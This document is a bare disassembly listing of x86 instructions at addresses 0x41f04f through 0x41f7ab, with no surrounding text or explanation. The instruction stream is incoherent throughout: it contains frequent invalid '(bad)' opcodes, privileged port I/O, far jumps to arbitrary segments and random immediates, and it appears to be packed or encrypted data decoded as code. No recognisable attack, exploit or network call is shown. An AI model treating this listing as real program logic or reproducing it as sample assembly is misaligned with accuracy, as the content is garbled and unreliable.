  41f04f:	and    al,0xa4
  41f051:	sbb    eax,0x17d9a26e
  41f056:	stos   BYTE PTR es:[edi],al
  41f057:	jne    0x41f011
  41f059:	sbb    bl,BYTE PTR [eax]
  41f05b:	inc    edi
  41f05c:	aas    
  41f05d:	push   cs
  41f05e:	js     0x41efff
  41f060:	das    
  41f061:	test   BYTE PTR [eax],bl
  41f063:	popf   
  41f064:	ror    ecx,1
  41f066:	add    eax,0xac0e682a
  41f06b:	jmp    0x41f089
  41f06d:	(bad)  
  41f06e:	sbb    al,0xbb
  41f070:	pop    ecx
  41f071:	sbb    DWORD PTR [eax-0x265c82b7],edx
  41f077:	pop    ebp
  41f078:	mov    al,0x19
  41f07a:	loope  0x41f00d
  41f07c:	xor    eax,0x90d98a04
  41f081:	mov    fs,WORD PTR [esi+0x5230bf5e]
  41f087:	cli    
  41f088:	adc    ah,al
  41f08a:	sar    BYTE PTR [esi+0x81a7fe2],0xbd
  41f091:	cmp    DWORD PTR [ebp+0x17b83ce3],ebx
  41f097:	sub    DWORD PTR [esi-0x2b],edi
  41f09a:	pop    edi
  41f09b:	push   eax
  41f09c:	jne    0x41f05a
  41f09e:	adc    al,cl
  41f0a0:	sbb    ch,ch
  41f0a2:	cmp    ebx,DWORD PTR [ebx+0x37f80298]
  41f0a8:	cld    
  41f0a9:	pop    eax
  41f0aa:	out    0x49,eax
  41f0ac:	xchg   edx,eax
  41f0ad:	ret    0x4306
  41f0b0:	mov    dh,0xdc
  41f0b2:	retf   
  41f0b3:	xor    ebx,edi
  41f0b5:	fisub  DWORD PTR [eax+0x42]
  41f0b8:	push   eax
  41f0b9:	mov    ebp,esp
  41f0bb:	sub    ecx,DWORD PTR [ecx-0x254ed4f1]
  41f0c1:	dec    esp
  41f0c2:	in     eax,0x26
  41f0c4:	jno    0x41f0e0
  41f0c6:	xchg   DWORD PTR [ecx+0x2c],esp
  41f0c9:	fnstenv [ebx]
  41f0cb:	pop    ebx
  41f0cc:	or     al,0x65
  41f0ce:	xor    esp,DWORD PTR [edx]
  41f0d0:	sbb    DWORD PTR [edi+edx*8],ebx
  41f0d3:	pop    ecx
  41f0d4:	mov    edx,0xed9f2753
  41f0d9:	dec    edi
  41f0da:	mov    bl,0x31
  41f0dc:	push   edx
  41f0dd:	retf   0xeb6b
  41f0e0:	mov    ecx,esp
  41f0e2:	nop
  41f0e3:	int3   
  41f0e4:	popf   
  41f0e5:	lea    edx,[ebp-0x72]
  41f0e8:	(bad)  
  41f0e9:	jbe    0x41f105
  41f0eb:	mov    fs,WORD PTR [ebx]
  41f0ed:	adc    eax,0x8083fa68
  41f0f2:	mov    ch,0x88
  41f0f4:	inc    esi
  41f0f5:	or     dh,BYTE PTR [edx-0x80]
  41f0f8:	push   edx
  41f0f9:	ja     0x41f177
  41f0fb:	cmp    al,0x6a
  41f0fd:	mov    dh,BYTE PTR [ebp-0x3b391c17]
  41f103:	inc    esp
  41f104:	push   eax
  41f105:	or     ecx,DWORD PTR [ecx+0x62]
  41f108:	xchg   edx,eax
  41f109:	mov    esp,0x2426628d
  41f10e:	repnz bswap edx
  41f111:	out    0x2a,eax
  41f113:	jnp    0x41f0bf
  41f115:	adc    ah,BYTE PTR [ebx]
  41f117:	inc    ebp
  41f118:	test   BYTE PTR [esi],ch
  41f11a:	imul   BYTE PTR [edx+0x6f]
  41f11d:	jmp    0x41f180
  41f11f:	inc    edi
  41f120:	mov    ch,0x24
  41f122:	shr    BYTE PTR [ebp-0x5c],cl
  41f125:	adc    al,0xfd
  41f127:	jecxz  0x41f14f
  41f129:	mov    al,BYTE PTR [edx+ebp*2+0x4c]
  41f12d:	imul   esi,DWORD PTR [edi-0x32de0a38],0xfffffff8
  41f134:	pop    edi
  41f135:	xchg   esp,eax
  41f136:	(bad)  [ebx+eiz*2+0x3e]
  41f13a:	or     edx,DWORD PTR [ecx-0x7bc9a32c]
  41f140:	int3   
  41f141:	repz sbb DWORD PTR [esi+0x78681f80],0xffffff87
  41f149:	add    DWORD PTR [edx+edi*8-0x7f],0x76
  41f14e:	lods   al,BYTE PTR ds:[esi]
  41f14f:	pusha  
  41f150:	int    0x48
  41f152:	pop    ebx
  41f153:	(bad)  
  41f154:	lds    eax,FWORD PTR [ebx]
  41f156:	xor    bh,BYTE PTR [ebx-0x1b]
  41f159:	mov    esp,0x966ba1ff
  41f15e:	sub    eax,0x5a3f96ab
  41f163:	add    ch,BYTE PTR [esi+0x1ff5c4f2]
  41f169:	(bad)  
  41f16a:	in     al,0x70
  41f16c:	push   0x47
  41f16e:	in     eax,0x79
  41f170:	dec    edi
  41f171:	xlat   BYTE PTR ds:[ebx]
  41f172:	cmc    
  41f173:	sahf   
  41f174:	and    cl,al
  41f176:	add    dl,dl
  41f178:	rcr    DWORD PTR [ebp+0x2ad668],cl
  41f17e:	ja     0x41f16c
  41f180:	xchg   esi,eax
  41f181:	xchg   esp,eax
  41f182:	daa    
  41f183:	mov    esp,ss
  41f185:	fld    QWORD PTR [eax-0x3a963834]
  41f18b:	lds    esi,FWORD PTR [edi-0x31cfa6f7]
  41f191:	mov    eax,?
  41f193:	rcl    BYTE PTR [ebp+eiz*8+0x7f948e03],0x96
  41f19b:	push   ecx
  41f19c:	clc    
  41f19d:	push   es
  41f19e:	nop
  41f19f:	leave  
  41f1a0:	xchg   esi,eax
  41f1a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1a2:	out    dx,al
  41f1a3:	pop    ecx
  41f1a4:	push   0xc81976b0
  41f1a9:	dec    eax
  41f1aa:	test   eax,0xd42ab2cf
  41f1af:	call   0xc17687f
  41f1b4:	pop    eax
  41f1b5:	mov    ch,0xc0
  41f1b7:	mov    cl,0x58
  41f1b9:	lea    ebp,[eax]
  41f1bb:	ds je  0x41f1e1
  41f1be:	out    dx,al
  41f1bf:	mov    ah,0xa5
  41f1c1:	sub    cl,0x3a
  41f1c4:	aas    
  41f1c5:	push   cs
  41f1c6:	adc    esi,DWORD PTR [edx]
  41f1c8:	dec    eax
  41f1c9:	pop    esi
  41f1ca:	mov    esp,0x331fabbf
  41f1cf:	jo     0x41f1a5
  41f1d1:	jg     0x41f18f
  41f1d3:	push   esp
  41f1d4:	xlat   BYTE PTR ds:[ebx]
  41f1d5:	aas    
  41f1d6:	push   edx
  41f1d7:	pop    esi
  41f1d8:	mov    BYTE PTR [edx-0x56],al
  41f1db:	and    DWORD PTR [ebx+0x79846025],esp
  41f1e1:	and    al,0x70
  41f1e3:	fldenv [ebp-0x43]
  41f1e6:	rcr    DWORD PTR [ebx+0x51],1
  41f1e9:	add    ebx,DWORD PTR [eax+0x284efe2]
  41f1ef:	cs push ecx
  41f1f1:	pop    es
  41f1f2:	(bad)  [edx+0x7ac9c884]
  41f1f8:	pop    ebp
  41f1f9:	dec    ebp
  41f1fa:	iret   
  41f1fb:	and    al,0x36
  41f1fd:	frstor gs:[eax-0x4888bfc8]
  41f204:	push   ss
  41f205:	push   esi
  41f206:	rol    ecx,1
  41f208:	test   eax,0xb4dc7b2f
  41f20d:	cmp    DWORD PTR [ebx-0x1b],eax
  41f210:	scas   eax,DWORD PTR es:[edi]
  41f211:	gs inc eax
  41f213:	mov    esp,ss
  41f215:	clc    
  41f216:	fmul   DWORD PTR [eax-0x37c2e71d]
  41f21c:	iret   
  41f21d:	xor    esp,DWORD PTR [edx]
  41f21f:	(bad)  
  41f220:	and    esp,DWORD PTR [ecx+0x9]
  41f223:	(bad)  
  41f224:	in     eax,0x8b
  41f226:	adc    eax,0x42887802
  41f22b:	xchg   edi,eax
  41f22c:	xor    al,0xd3
  41f22e:	mov    eax,0x234e2bad
  41f233:	aad    0x87
  41f235:	cmp    edx,ecx
  41f237:	push   ecx
  41f238:	ins    BYTE PTR es:[edi],dx
  41f239:	pop    ebp
  41f23a:	xchg   esi,eax
  41f23b:	add    eax,esp
  41f23d:	out    dx,al
  41f23e:	add    DWORD PTR [esi-0x5114554a],esi
  41f244:	sar    BYTE PTR [edx+0x5926eae1],0xdb
  41f24b:	loope  0x41f253
  41f24d:	pop    es
  41f24e:	ins    DWORD PTR es:[edi],dx
  41f24f:	xchg   esi,eax
  41f250:	add    eax,0xb0eb88a0
  41f255:	call   0xb8eb3e8a
  41f25a:	ds fst st(0)
  41f25d:	popa   
  41f25e:	jno    0x41f2c7
  41f260:	fs jo  0x41f265
  41f263:	pop    edi
  41f264:	loopne 0x41f2da
  41f266:	mov    bl,0x80
  41f268:	pop    ebp
  41f269:	jno    0x41f207
  41f26b:	push   ds
  41f26c:	inc    ecx
  41f26d:	leave  
  41f26e:	cwde   
  41f26f:	inc    ebp
  41f270:	repz sbb al,0x4a
  41f273:	jns    0x41f216
  41f275:	push   ecx
  41f276:	fnstsw WORD PTR [ebp+0x7bb1dd1c]
  41f27c:	cmp    eax,0xe5d73bf1
  41f281:	ret    
  41f282:	or     DWORD PTR [edi],ebx
  41f284:	jae    0x41f290
  41f286:	xchg   esp,eax
  41f287:	and    eax,0x5469ebdd
  41f28c:	pop    ss
  41f28d:	sub    bl,dl
  41f28f:	xor    BYTE PTR [edi],dl
  41f291:	pop    ss
  41f292:	adc    edx,DWORD PTR [ebx-0x2]
  41f295:	ss mov dl,0x4c
  41f298:	mov    edx,0x222afec1
  41f29d:	jb     0x41f309
  41f29f:	lahf   
  41f2a0:	jbe    0x41f29a
  41f2a2:	sub    ebp,edi
  41f2a4:	sub    al,0x54
  41f2a6:	adc    BYTE PTR [edx+0x23],0x3d
  41f2aa:	loop   0x41f247
  41f2ac:	dec    ebp
  41f2ad:	mov    cl,0x29
  41f2af:	mov    eax,0x17b193a
  41f2b4:	add    al,0x38
  41f2b6:	fdivr  DWORD PTR ds:0x22db822e
  41f2bc:	xchg   DWORD PTR [ebx+edi*8],ecx
  41f2bf:	leave  
  41f2c0:	icebp  
  41f2c1:	add    al,0xdb
  41f2c3:	sbb    edi,DWORD PTR [ebx]
  41f2c5:	call   0xcb60a98e
  41f2ca:	(bad)  
  41f2cb:	pop    ebx
  41f2cc:	shr    bh,1
  41f2ce:	pop    es
  41f2cf:	lock mov ebp,0x16f0f11d
  41f2d5:	jno    0x41f267
  41f2d7:	cmp    edi,DWORD PTR [edi+ebx*4+0x22]
  41f2db:	push   edi
  41f2dc:	xchg   edx,eax
  41f2dd:	rcr    DWORD PTR [esi],0xb0
  41f2e0:	sahf   
  41f2e1:	sahf   
  41f2e2:	jbe    0x41f2ee
  41f2e4:	stos   BYTE PTR es:[edi],al
  41f2e5:	adc    dl,BYTE PTR [ebx]
  41f2e7:	shl    edi,1
  41f2e9:	mov    cl,0xdd
  41f2eb:	pop    ebp
  41f2ec:	push   esi
  41f2ed:	cmc    
  41f2ee:	and    esp,DWORD PTR [edi+0x26]
  41f2f1:	push   ecx
  41f2f2:	xor    eax,0xda615d84
  41f2f7:	mov    WORD PTR [ecx+0x66],ss
  41f2fa:	sbb    al,0x89
  41f2fc:	lea    ecx,[ebx]
  41f2fe:	inc    eax
  41f2ff:	jmp    0xad5d:0x369aa3cc
  41f306:	arpl   cx,bx
  41f308:	imul   esi,ebx,0xffffff8d
  41f30b:	sub    al,0x9d
  41f30d:	or     dh,dl
  41f30f:	stos   DWORD PTR es:[edi],eax
  41f310:	dec    esi
  41f311:	aad    0xb8
  41f313:	mov    ch,0xf1
  41f315:	mov    DWORD PTR [edi+0x25a3ff11],edi
  41f31b:	pop    ds
  41f31c:	pushf  
  41f31d:	sub    al,0x8a
  41f31f:	inc    eax
  41f320:	mov    bl,0x4
  41f322:	and    esi,esi
  41f324:	daa    
  41f325:	(bad)  
  41f327:	or     al,dh
  41f329:	imul   esp,DWORD PTR [edx+0x41],0x71d91680
  41f330:	and    eax,DWORD PTR [esi]
  41f332:	test   DWORD PTR [edi],eax
  41f334:	js     0x41f317
  41f336:	cmp    dl,BYTE PTR ds:0xc00e3d80
  41f33c:	out    dx,al
  41f33d:	and    al,0xb3
  41f33f:	xor    al,0x17
  41f341:	xchg   edi,eax
  41f342:	cs cs jg 0x41f32f
  41f346:	jae    0x41f392
  41f348:	sub    cl,ch
  41f34a:	dec    esp
  41f34b:	sbb    BYTE PTR [esi-0xeaad283],cl
  41f351:	sub    dh,BYTE PTR [edx-0x4cf32ca1]
  41f357:	mov    edx,DWORD PTR [eax]
  41f359:	mov    esi,0xe2977de6
  41f35e:	leave  
  41f35f:	xor    eax,0xd4c3cb4b
  41f364:	jne    0x41f381
  41f366:	(bad)  
  41f367:	adc    eax,DWORD PTR [edi+eiz*1]
  41f36a:	xchg   esi,eax
  41f36b:	js     0x41f35a
  41f36d:	js     0x41f3ba
  41f36f:	sub    DWORD PTR [edx+esi*8],0xdf45c2eb
  41f376:	jae    0x41f3d3
  41f378:	add    eax,0x25c4454b
  41f37d:	xchg   esi,eax
  41f37e:	sbb    al,BYTE PTR [eax-0x72]
  41f381:	mov    ds:0xde6e4add,eax
  41f386:	idiv   BYTE PTR [edx-0x2d5cb9b5]
  41f38c:	push   es
  41f38d:	jnp    0x41f3ad
  41f38f:	test   al,0x7a
  41f391:	loop   0x41f393
  41f393:	dec    esi
  41f394:	aaa    
  41f395:	or     bl,ch
  41f397:	push   ds
  41f398:	loope  0x41f3c0
  41f39a:	mov    bl,0x1
  41f39c:	test   al,0xf1
  41f39e:	mov    dh,0x2c
  41f3a0:	xor    eax,DWORD PTR [ecx-0x7e901199]
  41f3a6:	ret    0xe8bd
  41f3a9:	pusha  
  41f3aa:	sub    DWORD PTR [eax+eax*2],esi
  41f3ad:	push   0xffffffd7
  41f3af:	(bad)  
  41f3b0:	sub    ebp,edx
  41f3b2:	daa    
  41f3b3:	shl    BYTE PTR [esi-0x67621608],0x45
  41f3ba:	out    0xd3,al
  41f3bc:	(bad)  
  41f3bd:	psrld  mm6,mm0
  41f3c0:	(bad)  
  41f3c1:	sbb    ebx,eax
  41f3c3:	sahf   
  41f3c4:	scas   al,BYTE PTR es:[edi]
  41f3c5:	cmp    al,0x1e
  41f3c7:	xchg   edi,eax
  41f3c8:	push   edi
  41f3c9:	pop    edi
  41f3ca:	dec    ebp
  41f3cb:	jecxz  0x41f35f
  41f3cd:	test   DWORD PTR [esi-0x1200401c],esi
  41f3d3:	adc    bh,dl
  41f3d5:	sbb    esp,edx
  41f3d7:	pop    edi
  41f3d8:	jmp    0xd0a46639
  41f3dd:	loopne 0x41f407
  41f3df:	pop    ss
  41f3e0:	daa    
  41f3e1:	xor    al,0x86
  41f3e3:	imul   edx,DWORD PTR [ecx],0x60
  41f3e6:	mov    ecx,ss
  41f3e8:	inc    esp
  41f3e9:	or     BYTE PTR [eax],0x83
  41f3ec:	jne    0x41f46c
  41f3ee:	inc    ebp
  41f3ef:	cmp    DWORD PTR [edx+eiz*8+0x77ccfb2e],ebp
  41f3f6:	out    0x73,eax
  41f3f8:	add    eax,0x76e41fe7
  41f3fd:	pop    ebp
  41f3fe:	outs   dx,BYTE PTR ds:[esi]
  41f3ff:	pop    ecx
  41f400:	xchg   edi,eax
  41f401:	ins    DWORD PTR es:[edi],dx
  41f402:	scas   eax,DWORD PTR es:[edi]
  41f403:	push   edx
  41f404:	rcl    DWORD PTR [ecx+0x6b],1
  41f407:	dec    edx
  41f408:	imul   eax,DWORD PTR [eax],0xdf95f46c
  41f40e:	popa   
  41f40f:	stos   DWORD PTR es:[edi],eax
  41f410:	xor    ch,dl
  41f412:	mov    ds:0xd82504e6,al
  41f417:	loopne 0x41f419
  41f419:	xchg   ebp,eax
  41f41a:	jnp    0x41f45c
  41f41c:	stc    
  41f41d:	fs dec ebp
  41f41f:	retf   0xa7ab
  41f422:	pop    ds
  41f423:	fwait
  41f424:	sbb    DWORD PTR [eax],ebx
  41f426:	rol    BYTE PTR [esi+0x5d],1
  41f429:	mov    ebx,0x3e14aa34
  41f42e:	cmp    al,0xe4
  41f430:	and    eax,0xf795caee
  41f435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f436:	fwait
  41f437:	imul   ebx,esi,0x4d
  41f43a:	sbb    BYTE PTR [esi-0x69538c01],ch
  41f440:	stc    
  41f441:	and    dl,bh
  41f443:	iret   
  41f444:	xor    eax,DWORD PTR [ebx-0x22]
  41f447:	adc    BYTE PTR [ebx+0x573236b6],al
  41f44d:	jl     0x41f44c
  41f44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f450:	inc    esp
  41f451:	sbb    eax,0xbe545833
  41f456:	out    0x4e,al
  41f458:	icebp  
  41f459:	dec    edx
  41f45a:	adc    bl,0xa1
  41f45d:	sbb    bh,BYTE PTR [edi+0x2838765b]
  41f463:	nop
  41f464:	mov    WORD PTR [ebp+0x3851509a],ss
  41f46a:	sub    bh,al
  41f46c:	iret   
  41f46d:	enter  0x6c53,0xc2
  41f471:	jae    0x41f4e4
  41f473:	xor    DWORD PTR [ecx],0xffffffa7
  41f476:	inc    ebx
  41f477:	cmc    
  41f478:	loope  0x41f4eb
  41f47a:	mov    al,0x9f
  41f47c:	pop    ds
  41f47d:	pop    ebx
  41f47e:	shl    esi,1
  41f480:	test   al,0xd4
  41f482:	xchg   edi,eax
  41f483:	push   es
  41f484:	push   esp
  41f485:	popf   
  41f486:	and    eax,0xfcd31b03
  41f48b:	add    eax,0x606fdd9d
  41f490:	mov    edi,0x8e7cd6ea
  41f495:	cmp    DWORD PTR [esi+0x6fb8dab8],ebp
  41f49b:	mov    ch,0xbc
  41f49d:	push   0x37
  41f49f:	mov    BYTE PTR [ecx-0x743ef623],al
  41f4a5:	mov    al,ds:0x320f0d35
  41f4aa:	fwait
  41f4ab:	sbb    edx,DWORD PTR [edi]
  41f4ad:	jo     0x41f472
  41f4af:	fimul  DWORD PTR [ebx+0x3b]
  41f4b2:	pop    edi
  41f4b3:	or     al,0xa
  41f4b5:	dec    eax
  41f4b6:	lock push esp
  41f4b8:	test   eax,0x82785000
  41f4bd:	inc    eax
  41f4be:	dec    edx
  41f4bf:	ja     0x41f4a1
  41f4c1:	add    dl,BYTE PTR ds:0xfb30d5c
  41f4c7:	idiv   DWORD PTR [edi]
  41f4c9:	push   0x6f
  41f4cb:	mov    cl,0x5
  41f4cd:	clc    
  41f4ce:	lds    eax,FWORD PTR [ebx-0x44]
  41f4d1:	cmp    esp,DWORD PTR ds:0x63e9c7b8
  41f4d7:	push   ds
  41f4d8:	mov    ebx,DWORD PTR [edi+0x2e135673]
  41f4de:	fnsave [eax+esi*8]
  41f4e1:	pop    ebx
  41f4e2:	xchg   ecx,eax
  41f4e3:	pop    ss
  41f4e4:	add    eax,0x76e8aa0b
  41f4e9:	pop    ebx
  41f4ea:	mov    al,0x90
  41f4ec:	in     eax,0xb6
  41f4ee:	push   eax
  41f4ef:	js     0x41f524
  41f4f1:	loop   0x41f4b8
  41f4f3:	and    DWORD PTR [ebx+0x626e46ea],ecx
  41f4f9:	test   eax,0xe5e06712
  41f4fe:	int3   
  41f4ff:	ret    0xc1a0
  41f502:	mov    ds:0xd69744fc,al
  41f507:	imul   esp,DWORD PTR [ecx-0x6b0738c4],0x4c3ac13c
  41f511:	mov    ebp,0xdfa34199
  41f516:	cmp    al,0x62
  41f518:	inc    ebp
  41f519:	push   0xffffffc7
  41f51b:	fld    TBYTE PTR [esp+eax*4-0xe]
  41f51f:	cli    
  41f520:	dec    esi
  41f521:	lds    esi,FWORD PTR [esi-0x34]
  41f524:	inc    edi
  41f525:	jle    0x41f564
  41f527:	sbb    esi,ebx
  41f529:	mov    edx,DWORD PTR [edi]
  41f52b:	mov    ch,0xf0
  41f52d:	sbb    eax,0xcab62d1d
  41f532:	mov    ah,0xcb
  41f534:	or     al,0xbc
  41f536:	jae    0x41f4eb
  41f538:	nop
  41f539:	in     al,dx
  41f53a:	xchg   edx,eax
  41f53b:	dec    ebp
  41f53c:	test   BYTE PTR [edi],dh
  41f53e:	xor    DWORD PTR ds:0xf78063ea,0xa87edd
  41f548:	cmp    al,BYTE PTR [ecx+0x79]
  41f54b:	xchg   edx,eax
  41f54c:	arpl   WORD PTR [esi+0x22],ax
  41f54f:	sub    edi,eax
  41f551:	jg     0x41f55f
  41f553:	pushf  
  41f554:	push   es
  41f555:	or     ch,0x7c
  41f558:	mov    esi,DWORD PTR [edx+ecx*2+0x4c]
  41f55c:	test   dh,bl
  41f55e:	jmp    0x41f4f8
  41f560:	lock pop ss
  41f562:	bound  esi,QWORD PTR [edx-0x18]
  41f565:	mov    al,ds:0xdd954b37
  41f56a:	and    eax,0xb795a0ed
  41f56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f570:	adc    DWORD PTR [edx+0x467c2e2e],ecx
  41f576:	(bad)  
  41f577:	(bad)  
  41f578:	mov    ebx,0xd6fc53cc
  41f57d:	xor    DWORD PTR [ecx+0x59],ebx
  41f580:	push   esp
  41f581:	lea    edi,[edx-0x21]
  41f584:	jo     0x41f59b
  41f586:	push   DWORD PTR [esi]
  41f588:	xor    eax,0xacc6e4ea
  41f58d:	and    esi,DWORD PTR [edi]
  41f58f:	add    DWORD PTR [ecx+edx*4],edx
  41f592:	fisubr WORD PTR [ebx]
  41f594:	bound  eax,QWORD PTR [ecx+0xe9382ae]
  41f59a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f59b:	inc    esi
  41f59c:	icebp  
  41f59d:	and    al,0x27
  41f59f:	test   eax,0x626b8409
  41f5a4:	call   0x21848325
  41f5a9:	aas    
  41f5aa:	xchg   ebx,eax
  41f5ab:	ins    BYTE PTR es:[edi],dx
  41f5ac:	fs ins BYTE PTR es:[edi],dx
  41f5ae:	jo     0x41f543
  41f5b0:	nop
  41f5b1:	loopne 0x41f607
  41f5b3:	ret    
  41f5b4:	sbb    ebx,DWORD PTR [ecx]
  41f5b6:	bound  ebx,QWORD PTR [ecx+eiz*1+0x36]
  41f5ba:	hlt    
  41f5bb:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5bd:	xlat   BYTE PTR ds:[ebx]
  41f5be:	fwait
  41f5bf:	leave  
  41f5c0:	add    edx,esp
  41f5c2:	paddd  mm6,QWORD PTR [edx+0x6c704144]
  41f5c9:	mov    al,0x0
  41f5cb:	inc    esi
  41f5cc:	and    ah,BYTE PTR [edx]
  41f5ce:	adc    eax,0x7aec099a
  41f5d3:	fsubr  DWORD PTR [esi+edx*4-0x2eb9059f]
  41f5da:	cmp    eax,0x3b0e32b4
  41f5e0:	inc    ebx
  41f5e1:	int3   
  41f5e2:	inc    ebx
  41f5e3:	bound  edx,QWORD PTR [ebx]
  41f5e5:	jno    0x41f5e4
  41f5e7:	sahf   
  41f5e8:	jmp    0x6c6f13ed
  41f5ed:	je     0x41f5a1
  41f5ef:	scas   eax,DWORD PTR es:[edi]
  41f5f0:	push   esp
  41f5f1:	push   esi
  41f5f2:	inc    esp
  41f5f3:	je     0x41f661
  41f5f5:	mov    ah,0xdb
  41f5f7:	sub    ebx,ebx
  41f5f9:	mov    esp,0x184fde39
  41f5fe:	or     al,0x4c
  41f600:	mov    dl,0x6f
  41f602:	mov    bl,0xb7
  41f604:	and    BYTE PTR [ebx+ecx*4],dl
  41f607:	pop    ds
  41f608:	inc    ebx
  41f609:	or     esp,DWORD PTR [edx]
  41f60b:	mov    dh,0xde
  41f60d:	das    
  41f60e:	cdq    
  41f60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f610:	aaa    
  41f611:	mov    ecx,0x16c53bfc
  41f616:	scas   al,BYTE PTR es:[edi]
  41f617:	dec    esi
  41f618:	mov    al,0xa6
  41f61a:	inc    ebx
  41f61b:	outs   dx,DWORD PTR ds:[esi]
  41f61c:	xor    bl,BYTE PTR ds:0x48a56ad8
  41f622:	pop    es
  41f623:	xchg   ebp,eax
  41f624:	cli    
  41f625:	dec    esp
  41f626:	cwde   
  41f627:	mov    bl,0xeb
  41f629:	addr16 shl eax,cl
  41f62c:	push   esi
  41f62d:	test   BYTE PTR [ecx+ebx*1+0xf],ch
  41f631:	sub    bh,BYTE PTR [esi]
  41f633:	pop    esi
  41f634:	daa    
  41f635:	mov    ds:0xbe079615,eax
  41f63a:	(bad)  
  41f63b:	call   0x2e9e:0x15d5ef5b
  41f642:	inc    eax
  41f643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f644:	or     eax,0x7d6e4ea7
  41f649:	jbe    0x41f686
  41f64b:	cmp    BYTE PTR [ebp-0x194247e5],bl
  41f651:	mov    al,0x42
  41f653:	enter  0x52bc,0x32
  41f657:	jne    0x41f674
  41f659:	or     eax,0xfe8d44fc
  41f65e:	loope  0x41f5eb
  41f660:	mov    al,al
  41f662:	lods   eax,DWORD PTR ds:[esi]
  41f663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f664:	ins    BYTE PTR es:[edi],dx
  41f665:	js     0x41f5e8
  41f667:	mov    ds:0xe34c009b,al
  41f66c:	add    al,0x9
  41f66e:	enter  0x75c1,0x5d
  41f672:	sbb    cl,bh
  41f674:	inc    esi
  41f675:	mov    cl,BYTE PTR [ebx-0x32]
  41f678:	sub    al,0x3a
  41f67a:	sbb    ebp,DWORD PTR [edx+0x66]
  41f67d:	mov    ebx,0xabae52a6
  41f682:	xor    eax,0x68e203
  41f687:	daa    
  41f688:	in     al,dx
  41f689:	dec    eax
  41f68a:	nop
  41f68b:	xchg   ebx,eax
  41f68c:	std    
  41f68d:	sub    cl,BYTE PTR [ecx+0x54]
  41f690:	jmp    0x41f636
  41f692:	pop    esp
  41f693:	std    
  41f694:	ds aas 
  41f696:	dec    esp
  41f697:	popf   
  41f698:	mov    ds:0x557e4fe6,eax
  41f69d:	xchg   edi,eax
  41f69e:	push   es
  41f69f:	cmp    ah,BYTE PTR [ebp-0x70cd307b]
  41f6a5:	mov    ah,0x78
  41f6a7:	inc    ebp
  41f6a8:	rcr    al,0xe1
  41f6ab:	jo     0x41f681
  41f6ad:	fs das 
  41f6af:	mov    DWORD PTR [esp+ecx*8+0x307c9098],0xb40e36e2
  41f6ba:	push   0x8e08c0a
  41f6bf:	ret    0x43f
  41f6c2:	mov    dh,0x7a
  41f6c4:	iret   
  41f6c5:	stos   DWORD PTR es:[edi],eax
  41f6c6:	call   0x1990c336
  41f6cb:	adc    DWORD PTR [ebp+eiz*1+0x38],ebp
  41f6cf:	cdq    
  41f6d0:	adc    DWORD PTR [edx],esp
  41f6d2:	jg     0x41f6da
  41f6d4:	or     DWORD PTR es:[edi],edx
  41f6d7:	mov    edx,0x46aebde3
  41f6dc:	pop    ebx
  41f6dd:	add    BYTE PTR [eax],bh
  41f6df:	xchg   BYTE PTR [edi],ah
  41f6e1:	call   0xcda1:0xdcfe76fc
  41f6e8:	jbe    0x41f687
  41f6ea:	inc    edx
  41f6eb:	mov    bl,0x27
  41f6ed:	or     BYTE PTR [ebx],0xe0
  41f6f0:	enter  0x18a2,0x95
  41f6f4:	push   ecx
  41f6f5:	pushf  
  41f6f6:	outs   dx,DWORD PTR ds:[esi]
  41f6f7:	inc    ecx
  41f6f8:	in     al,dx
  41f6f9:	fsub   st(4),st
  41f6fb:	iret   
  41f6fc:	out    0x61,eax
  41f6fe:	push   es
  41f6ff:	lahf   
  41f700:	sbb    ah,BYTE PTR [esi+esi*8]
  41f703:	jmp    0xd02:0x620e8eae
  41f70a:	jo     0x41f6d5
  41f70c:	cwde   
  41f70d:	shl    DWORD PTR [edi-0x554e6efd],cl
  41f713:	add    ebx,ebp
  41f715:	in     eax,dx
  41f716:	adc    edi,DWORD PTR [ecx-0x72]
  41f719:	sub    esi,DWORD PTR [ebx]
  41f71b:	hlt    
  41f71c:	xor    BYTE PTR [ecx],0x8e
  41f71f:	aaa    
  41f720:	push   ss
  41f721:	cld    
  41f722:	sub    al,0xf0
  41f724:	mov    esp,0x4bf127e0
  41f729:	mov    cl,0x51
  41f72b:	sub    eax,0x9ffda29f
  41f730:	sub    esi,DWORD PTR [edx]
  41f732:	lds    esp,FWORD PTR [esi+eiz*4-0x30]
  41f736:	jb     0x41f72e
  41f738:	arpl   WORD PTR ds:0xea275e7d,di
  41f73e:	scas   eax,DWORD PTR es:[edi]
  41f73f:	mov    al,BYTE PTR [eax+0x64]
  41f742:	adc    eax,0x4bda8894
  41f747:	pop    ebp
  41f748:	dec    esp
  41f749:	retf   0x309b
  41f74c:	cld    
  41f74d:	rol    BYTE PTR [eax-0x7b6d418f],1
  41f753:	ret    0x43b0
  41f756:	das    
  41f757:	popw   ds
  41f759:	cmp    eax,0x3325ec4e
  41f75e:	test   BYTE PTR [esi-0x1f],ah
  41f761:	test   DWORD PTR [esi-0x36cb2cd],esi
  41f767:	(bad)  
  41f768:	std    
  41f769:	or     ch,ch
  41f76b:	and    al,0x5d
  41f76d:	xchg   ebx,eax
  41f76e:	xor    BYTE PTR [esi+0x3d],0x69
  41f772:	jo     0x41f7ea
  41f774:	out    dx,al
  41f775:	outs   dx,DWORD PTR ds:[esi]
  41f776:	xchg   DWORD PTR ds:0x24779036,ebx
  41f77c:	js     0x41f773
  41f77e:	dec    edx
  41f77f:	js     0x41f7b5
  41f781:	int    0x72
  41f783:	std    
  41f784:	cmp    esi,DWORD PTR [ecx+0x570876e5]
  41f78a:	aaa    
  41f78b:	popf   
  41f78c:	jle    0x41f732
  41f78e:	push   0x7656693d
  41f793:	out    0x38,al
  41f795:	adc    ch,al
  41f797:	leave  
  41f798:	or     al,0xc5
  41f79a:	mov    ss,ebx
  41f79c:	test   al,0xf0
  41f79e:	jne    0x41f818
  41f7a0:	stc    
  41f7a1:	aad    0x5
  41f7a3:	push   es
  41f7a4:	mov    cl,BYTE PTR [ebp-0x12]
  41f7a7:	xchg   esi,eax
  41f7a8:	dec    edx
  41f7a9:	mov    cl,0xfc
  41f7ab:	fs cli 
